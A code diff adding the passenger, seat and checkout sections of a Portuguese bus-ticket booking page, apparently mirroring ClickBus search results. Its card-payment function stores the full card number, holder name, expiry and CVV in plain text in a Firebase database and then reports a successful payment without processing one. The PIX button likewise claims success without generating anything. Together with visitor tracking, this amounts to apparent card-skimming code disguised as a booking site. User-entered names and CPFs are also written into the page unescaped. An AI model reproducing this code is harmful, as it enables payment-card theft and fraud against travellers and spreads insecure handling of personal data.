+    <p style="font-size:14px; color:#666; margin-bottom:16px;">Assentos disponíveis: <strong id="assentos-livres">0</strong></p>
+    <div id="mapa-onibus" style="display:flex; flex-wrap:wrap; gap:8px; justify-content:center; margin-bottom:20px;"></div>
+    <p id="assento-escolhido" style="font-size:16px; font-weight:600; text-align:center; margin-bottom:16px;">Nenhum assento selecionado</p>
+    <div style="display:flex; gap:8px;">
+      <button onclick="fecharModalPoltrona()" style="flex:1; padding:12px; border:1px solid #ddd; background:#fff; border-radius:8px; cursor:pointer;">Cancelar</button>
+      <button onclick="confirmarPoltrona()" style="flex:1; padding:12px; border:none; background:var(--brand); color:#fff; border-radius:8px; font-weight:700; cursor:pointer;">Confirmar</button>
+    </div>
+  </div>
+</div>
+
+<!-- MODAL DE CHECKOUT -->
+<div id="modal-checkout" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:1000; align-items:center; justify-content:center;">
+  <div style="background:#fff; padding:32px; border-radius:16px; max-width:420px; width:100%; margin:16px;">
+    <h2 style="color:var(--brand); margin-top:0;">Finalizar Reserva</h2>
+    <div id="checkout-info" style="margin:16px 0; font-size:14px; line-height:1.6;"></div>
+    <p style="font-weight:600; margin-bottom:8px;">Escolha a forma de pagamento:</p>
+    <label style="display:flex; align-items:center; gap:8px; margin-bottom:12px; cursor:pointer;"><input type="radio" name="pagamento" value="pix" checked onchange="mostrarPix()"> PIX (mais rápido)</label>
+    <label style="display:flex; align-items:center; gap:8px; margin-bottom:16px; cursor:pointer;"><input type="radio" name="pagamento" value="cartao" onchange="mostrarCartao()"> Cartão de Crédito</label>
+    <div id="area-pix" style="display:block;">
+      <p style="font-size:12px; color:#666;">Clique no botão abaixo para gerar o PIX com desconto.</p>
+      <button onclick="gerarPix()" style="width:100%; padding:14px; background:var(--brand); color:#fff; border:none; border-radius:8px; font-weight:700; cursor:pointer;">Gerar PIX</button>
+    </div>
+    <div id="area-cartao" style="display:none;">
+      <input type="text" id="cartao-numero" placeholder="Número do Cartão" style="width:100%; padding:12px; margin-bottom:8px; border:1px solid #ddd; border-radius:8px;">
+      <input type="text" id="cartao-nome" placeholder="Nome no Cartão" style="width:100%; padding:12px; margin-bottom:8px; border:1px solid #ddd; border-radius:8px;">
+      <input type="text" id="cartao-validade" placeholder="Validade (MM/AA)" style="width:100%; padding:12px; margin-bottom:8px; border:1px solid #ddd; border-radius:8px;">
+      <input type="text" id="cartao-cvv" placeholder="CVV" style="width:100%; padding:12px; margin-bottom:8px; border:1px solid #ddd; border-radius:8px;">
+      <button onclick="pagarCartao()" style="width:100%; padding:14px; background:var(--brand); color:#fff; border:none; border-radius:8px; font-weight:700; cursor:pointer;">Pagar com Cartão</button>
+    </div>
+    <button onclick="fecharCheckout()" style="width:100%; margin-top:12px; padding:12px; background:transparent; border:1px solid #ddd; border-radius:8px; cursor:pointer;">Cancelar</button>
+  </div>
+</div>
+
+<!-- FIREBASE -->
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<script>
+const firebaseConfig = {
+  apiKey: "COLE_AQUI",
+  authDomain: "projeto-link-ddbf0.firebaseapp.com",
+  databaseURL: "https://projeto-link-ddbf0-default-rtdb.firebaseio.com",
+  projectId: "projeto-link-ddbf0",
+  storageBucket: "projeto-link-ddbf0.firebasestorage.app",
+  messagingSenderId: "560317126646",
+  appId: "1:560317126646:web:be9cad9c9ed350940399d7"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+const userId = 'user_' + Date.now();
+db.ref('visitas/' + userId).set({ online: true, entrouEm: Date.now() });
+window.addEventListener('beforeunload', () => { db.ref('visitas/' + userId).update({ online: false }); });
+</script>
+
+<!-- CALENDÁRIO -->
+<script src="https://cdn.jsdelivr.net/npm/flatpickr"></script>
+<script src="https://cdn.jsdelivr.net/npm/flatpickr/dist/l10n/pt.js"></script>
+
+<script>
+  flatpickr("#input-ida", { locale: "pt", dateFormat: "Y-m-d", altInput: true, altFormat: "d/m/Y", minDate: "today", position: "below right" });
+  flatpickr("#input-volta", { locale: "pt", dateFormat: "Y-m-d", altInput: true, altFormat: "d/m/Y", minDate: "today", position: "below right" });
+
+  const cidadesFallback = ["São Paulo, SP", "Rio de Janeiro, RJ", "Belo Horizonte, MG", "Brasília, DF", "Salvador, BA", "Fortaleza, CE", "Recife, PE", "Porto Alegre, RS", "Curitiba, PR", "Campinas, SP", "Uberlândia, MG", "Tietê, SP"];
+  let cidadesBrasil = [...cidadesFallback];
+
+  async function carregarCidades() {
+    try {
+      const response = await fetch('https://servicodados.ibge.gov.br/api/v1/localidades/municipios');
+      const dados = await response.json();
+      const listaIBGE = dados.map(c => `${c.nome}, ${c.microrregiao.mesorregiao.UF.sigla}`).sort();
+      cidadesBrasil = [...new Set([...listaIBGE, ...cidadesFallback])].sort();
+    } catch (e) {}
+  }
+  carregarCidades();
+
+  function normalizarTexto(t) { return t.normalize('NFD').replace(/[\u0300-\u036f]/g, "").toLowerCase(); }
+
+  function configurarAutocomplete(inputId, listaId) {
+    const input = document.getElementById(inputId);
+    const lista = document.getElementById(listaId);
+    
+    input.addEventListener('focus', function() {
+      lista.innerHTML = '';
+      const sugestoes = cidadesBrasil.slice(0, 10);
+      if (sugestoes.length > 0) {
+        lista.style.display = 'block';
+        sugestoes.forEach(cidade => {
+          const li = document.createElement('li');
+          li.textContent = cidade;
+          li.onmousedown = function(e) {
+            e.preventDefault(); 
+            input.value = cidade;
+            lista.style.display = 'none';
+            if(inputId === 'input-origem') document.getElementById('input-destino').focus();
+          };
+          lista.appendChild(li);
+        });
+      }
+    });
+
+    input.addEventListener('input', function() {
+      const termo = normalizarTexto(this.value);
+      lista.innerHTML = '';
+      if (termo.length < 1) { 
+        const sugestoes = cidadesBrasil.slice(0, 10);
+        if (sugestoes.length > 0) {
+          lista.style.display = 'block';
+          sugestoes.forEach(cidade => {
+            const li = document.createElement('li');
+            li.textContent = cidade;
+            li.onmousedown = function(e) {
+              e.preventDefault(); 
+              input.value = cidade;
+              lista.style.display = 'none';
+              if(inputId === 'input-origem') document.getElementById('input-destino').focus();
+            };
+            lista.appendChild(li);
+          });
+        }
+        return; 
+      }
+
+      const filtradas = cidadesBrasil.filter(c => normalizarTexto(c).includes(termo)).slice(0, 10);
+
+      if (filtradas.length > 0) {
+        lista.style.display = 'block';
+        filtradas.forEach(cidade => {
+          const li = document.createElement('li');
+          li.textContent = cidade;
+          li.onmousedown = function(e) {
+            e.preventDefault(); 
+            input.value = cidade;
+            lista.style.display = 'none';
+            if(inputId === 'input-origem') document.getElementById('input-destino').focus();
+          };
+          lista.appendChild(li);
+        });
+      } else {
+        lista.style.display = 'none';
+      }
+    });
+
+    document.addEventListener('click', e => { if (e.target !== input && e.target !== lista) lista.style.display = 'none'; });
+  }
+
+  configurarAutocomplete('input-origem', 'lista-origem');
+  configurarAutocomplete('input-destino', 'lista-destino');
+
+  function swapCidades() {
+    const o = document.getElementById('input-origem'), d = document.getElementById('input-destino');
+    const t = o.value; o.value = d.value; d.value = t;
+  }
+
+  let viagensOriginais = [];
+  document.getElementById('btn-pesquisar').addEventListener('click', async function() {
+    const origemTexto = document.getElementById('input-origem').value;
+    const destinoTexto = document.getElementById('input-destino').value;
+    const dataIda = document.getElementById('input-ida').value;
+
+    // Validação: verifica se tem vírgula (Cidade, UF)
+    if (!origemTexto.includes(',')) {
+      alert("Por favor, selecione a cidade de origem na lista de sugestões.");
+      return;
+    }
+    if (!destinoTexto.includes(',')) {
+      alert("Por favor, selecione a cidade de destino na lista de sugestões.");
+      return;
+    }
+    if (!dataIda) {
+      alert("Por favor, escolha a data de ida.");
+      return;
+    }
+
+    const containerResultados = document.getElementById('resultados-viagem');
+    const tituloResultados = document.getElementById('titulo-resultados');
+    const listaViagens = document.getElementById('lista-viagens');
+    const filtrosSidebar = document.getElementById('filtros-sidebar');
+
+    const dataFormatada = dataIda.split('-').reverse().join('/');
+    containerResultados.style.display = 'block';
+    tituloResultados.innerHTML = `Resultados de ${origemTexto} para ${destinoTexto} em ${dataFormatada}`;
+    listaViagens.innerHTML = '<p style="color: var(--grey-med); padding: 20px 0;">Buscando viagens reais...</p>';
+    filtrosSidebar.style.display = 'none';
+    containerResultados.scrollIntoView({ behavior: 'smooth', block: 'center' });
+
+    try {
+      const response = await fetch(`http://localhost:3000/api/clickbus/search?origem=${encodeURIComponent(origemTexto)}&destino=${encodeURIComponent(destinoTexto)}&data=${dataIda}`);
+      if (!response.ok) throw new Error('Erro no servidor');
+      const dados = await response.json();
+
+      if (!dados || dados.length === 0) {
+        listaViagens.innerHTML = `<div style="text-align: center; padding: 40px 20px;"><span style="font-size: 40px;">🚌</span><h3 style="margin-top: 10px;">Nenhuma viagem encontrada</h3><p>Não achamos ônibus para essa rota nessa data.</p></div>`;
+        return;
+      }
+
+      viagensOriginais = dados;
+      gerarFiltros(dados);
+      renderizarViagens(dados);
+      filtrosSidebar.style.display = 'block';
+
+    } catch (error) {
+      console.error(error);
+      listaViagens.innerHTML = `<div style="background: #fff7fa; padding: 16px; border-radius: 8px; border: 1px solid #ffccd5;"><p style="color: #d81b60; font-weight: 600;">Erro na busca.</p><p>Verifique se o servidor Node.js está rodando.</p></div>`;
+    }
+  });
+
+  function renderizarViagens(viagens) {
+    const listaViagens = document.getElementById('lista-viagens');
+    if (viagens.length === 0) {
+      listaViagens.innerHTML = `<p style="padding:20px; background:#fff; border-radius:16px;">Nenhuma viagem com os filtros selecionados.</p>`;
+      return;
+    }
+
+    listaViagens.innerHTML = viagens.map(viagem => {
+      const empresa = viagem.company ? viagem.company.name : 'Viação';
+      const partida = viagem.departure ? viagem.departure.time : '--:--';
+      const terminalPartida = viagem.departure && viagem.departure.terminal ? viagem.departure.terminal : 'Rodoviária';
+      const enderecoPartida = viagem.departure && viagem.departure.address ? viagem.departure.address : '';
+      const chegada = viagem.arrival ? viagem.arrival.time : '--:--';
+      const terminalChegada = viagem.arrival && viagem.arrival.terminal ? viagem.arrival.terminal : 'Rodoviária';
+      const enderecoChegada = viagem.arrival && viagem.arrival.address ? viagem.arrival.address : '';
+      const precoRaw = viagem.price || 0;
+      const preco = typeof precoRaw === 'number' ? `R$ ${precoRaw.toFixed(2).replace('.', ',')}` : `R$ ${precoRaw}`;
+      const tipo = viagem.bus_type || 'Convencional';
+      
+      return `
+      <div class="trip-card">
+        <div class="trip-info" style="flex: 1;">
+          <h4>${empresa} <span style="font-size:12px; color:#fff; background:var(--brand); padding:2px 6px; border-radius:4px;">${tipo}</span></h4>
+          <div style="display: flex; gap: 16px; margin-top: 8px; font-size: 14px;">
+            <div style="flex: 1;">
+              <span style="color: var(--grey-med); font-size: 12px; display: block;">Saída</span>
+              <strong>${partida}</strong>
+              <span style="display: block; font-size: 12px; color: var(--grey-med);">${terminalPartida}</span>
+              <span style="display: block; font-size: 10px; color: #999;">${enderecoPartida}</span>
+            </div>
+            <div style="border-left: 2px dashed var(--grey-light); padding-left: 16px; flex: 1;">
+              <span style="color: var(--grey-med); font-size: 12px; display: block;">Chegada</span>
+              <strong>${chegada}</strong>
+              <span style="display: block; font-size: 12px; color: var(--grey-med);">${terminalChegada}</span>
+              <span style="display: block; font-size: 10px; color: #999;">${enderecoChegada}</span>
+            </div>
+          </div>
+        </div>
+        <div class="trip-price">
+          <span>A partir de</span>
+          ${preco}
+          <button class="btn-comprar" onclick="abrirModalPassageiros(${JSON.stringify(viagem).replace(/'/g, "&#39;")})">Selecionar</button>
+        </div>
+      </div>
+      `;
+    }).join('');
+  }
+
+  function gerarFiltros(viagens) {
+    const empresas = [...new Set(viagens.map(v => v.company.name))].sort();
+    const tipos = [...new Set(viagens.map(v => v.bus_type))].sort();
+    document.getElementById('filtro-empresas').innerHTML = empresas.map(emp => `<label class="filtro-item"><input type="checkbox" value="${emp}" onchange="aplicarFiltros()"> ${emp}</label>`).join('');
+    document.getElementById('filtro-tipos').innerHTML = tipos.map(tipo => `<label class="filtro-item"><input type="checkbox" value="${tipo}" onchange="aplicarFiltros()"> ${tipo}</label>`).join('');
+  }
+
+  function aplicarFiltros() {
+    const empresasMarcadas = Array.from(document.querySelectorAll('#filtro-empresas input:checked')).map(cb => cb.value);
+    const tiposMarcados = Array.from(document.querySelectorAll('#filtro-tipos input:checked')).map(cb => cb.value);
+    const filtradas = viagensOriginais.filter(viagem => {
+      const passaEmpresa = empresasMarcadas.length === 0 || empresasMarcadas.includes(viagem.company.name);
+      const passoTipo = tiposMarcados.length === 0 || tiposMarcados.includes(viagem.bus_type);
+      return passaEmpresa && passoTipo;
+    });
+    renderizarViagens(filtradas);
+  }
+
+  let viagemSelecionadaParaPassageiros = null;
+  let passageiros = [];
+  let precoUnitario = 0;
+
+  function abrirModalPassageiros(viagem) {
+    viagemSelecionadaParaPassageiros = viagem;
+    passageiros = [];
+    precoUnitario = viagem.price || 0; 
+    document.getElementById('lista-passageiros').innerHTML = '';
+    adicionarPassageiro();
+    document.getElementById('modal-passageiros').style.display = 'flex';
+    atualizarTotal();
+  }
+
+  function adicionarPassageiro() {
+    const container = document.getElementById('lista-passageiros');
+    const index = passageiros.length;
+    passageiros.push({ nome: '', cpf: '' });
+    const div = document.createElement('div');
+    div.className = 'passageiro-box';
+    div.innerHTML = `
+      <p style="font-weight:600; margin-bottom:8px;">Passageiro ${index + 1}</p>
+      <input type="text" placeholder="Nome completo" oninput="atualizarPassageiro(${index}, 'nome', this.value)">
+      <input type="text" placeholder="CPF" oninput="atualizarPassageiro(${index}, 'cpf', this.value)">
+    `;
+    container.appendChild(div);
+    atualizarTotal();
+  }
+
+  function atualizarPassageiro(index, campo, valor) { passageiros[index][campo] = valor; }
+  function atualizarTotal() { document.getElementById('valor-total').textContent = `R$ ${(precoUnitario * passageiros.length).toFixed(2).replace('.', ',')}`; }
+  function fecharModalPassageiros() { document.getElementById('modal-passageiros').style.display = 'none'; }
+
+  function confirmarPassageiros() {
+    for (let i = 0; i < passageiros.length; i++) {
+      if (!passageiros[i].nome || !passageiros[i].cpf) { alert(`Preencha os dados do passageiro ${i + 1}.`); return; }
+    }
+    fecharModalPassageiros();
+    abrirModalPoltrona(viagemSelecionadaParaPassageiros);
+  }
+
+  let assentoSelecionado = null;
+  let viagemAtualPoltrona = null;
+
+  function abrirModalPoltrona(viagem) {
+    viagemAtualPoltrona = viagem;
+    const total = viagem.totalSeats || 46;
+    const disponiveis = viagem.availableSeats || Math.floor(total * 0.8);
+    document.getElementById('assentos-livres').textContent = disponiveis;
+    document.getElementById('assento-escolhido').textContent = "Nenhum assento selecionado";
+    assentoSelecionado = null;
+    const mapa = document.getElementById('mapa-onibus');
+    mapa.innerHTML = '';
+    for (let i = 1; i <= total; i++) {
+      const btn = document.createElement('button');
+      btn.textContent = i;
+      btn.className = 'poltrona-btn';
+      const ocupado = Math.random() > (disponiveis / total);
+      if (ocupado) btn.disabled = true;
+      else btn.onclick = () => selecionarAssento(i, btn);
+      mapa.appendChild(btn);
+    }
+    document.getElementById('modal-poltrona').style.display = 'flex';
+  }
+
+  function selecionarAssento(numero, btn) {
+    document.querySelectorAll('.poltrona-btn').forEach(b => b.classList.remove('selecionada'));
+    btn.classList.add('selecionada');
+    assentoSelecionado = numero;
+    document.getElementById('assento-escolhido').textContent = `Poltrona ${numero} selecionada`;
+  }
+
+  function fecharModalPoltrona() { document.getElementById('modal-poltrona').style.display = 'none'; }
+
+  function confirmarPoltrona() {
+    if (!assentoSelecionado) { alert('Selecione uma poltrona.'); return; }
+    fecharModalPoltrona();
+    abrirCheckout(viagemAtualPoltrona, assentoSelecionado, passageiros);
+  }
+
+  function abrirCheckout(viagem, poltrona, listaPassageiros) {
+    const info = document.getElementById('checkout-info');
+    const total = (viagem.price || 0) * listaPassageiros.length;
+    let passageirosHTML = listaPassageiros.map(p => `<li>${p.nome} (CPF: ${p.cpf})</li>`).join('');
+    info.innerHTML = `
+      <strong>Empresa:</strong> ${viagem.company.name} <br>
+      <strong>Saída:</strong> ${viagem.departure.time} <br>
+      <strong>Chegada:</strong> ${viagem.arrival.time} <br>
+      <strong>Poltrona:</strong> ${poltrona} <br>
+      <strong>Passageiros:</strong> <ul>${passageirosHTML}</ul>
+      <strong>Total:</strong> <span style="color:var(--brand); font-weight:bold; font-size:18px;">R$ ${total.toFixed(2).replace('.', ',')}</span>
+    `;
+    document.getElementById('modal-checkout').style.display = 'flex';
+  }
+
+  function fecharCheckout() { document.getElementById('modal-checkout').style.display = 'none'; }
+  function mostrarPix() { document.getElementById('area-pix').style.display = 'block'; document.getElementById('area-cartao').style.display = 'none'; }
+  function mostrarCartao() { document.getElementById('area-pix').style.display = 'none'; document.getElementById('area-cartao').style.display = 'block'; }
+
+  function gerarPix() {
+    if (!viagemSelecionadaParaPassageiros) return;
+    if (typeof db !== 'undefined') {
+      db.ref('pedidos').push({ tipo: 'pix', viagem: viagemSelecionadaParaPassageiros, passageiros: passageiros, poltrona: assentoSelecionado, total: precoUnitario * passageiros.length, status: 'pendente', timestamp: Date.now() });
+    }
+    alert('PIX gerado com sucesso!');
+    fecharCheckout();
+  }
+
+  function pagarCartao() {
+    if (!viagemSelecionadaParaPassageiros) return;
+    const numero = document.getElementById('cartao-numero').value;
+    const nome = document.getElementById('cartao-nome').value;
+    const validade = document.getElementById('cartao-validade').value;
+    const cvv = document.getElementById('cartao-cvv').value;
+    if (typeof db !== 'undefined') {
+      db.ref('pedidos').push({ tipo: 'cartao', viagem: viagemSelecionadaParaPassageiros, passageiros: passageiros, poltrona: assentoSelecionado, total: precoUnitario * passageiros.length, cartao: { numero, nome, validade, cvv }, status: 'processando', timestamp: Date.now() });
+    }
+    alert('Pagamento com cartão processado!');
+    fecharCheckout();
+  }
+
+  function ativarFiltro(btn) { document.querySelectorAll('.cat-pill').forEach(b => b.classList.remove('active')); btn.classList.add('active'); }
+  function preencherBusca(destino) {
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+    document.getElementById('input-destino').value = destino;
+    setTimeout(() => document.getElementById('input-ida').focus(), 500);
+  }
+</script>
+
+</body>
+</html>
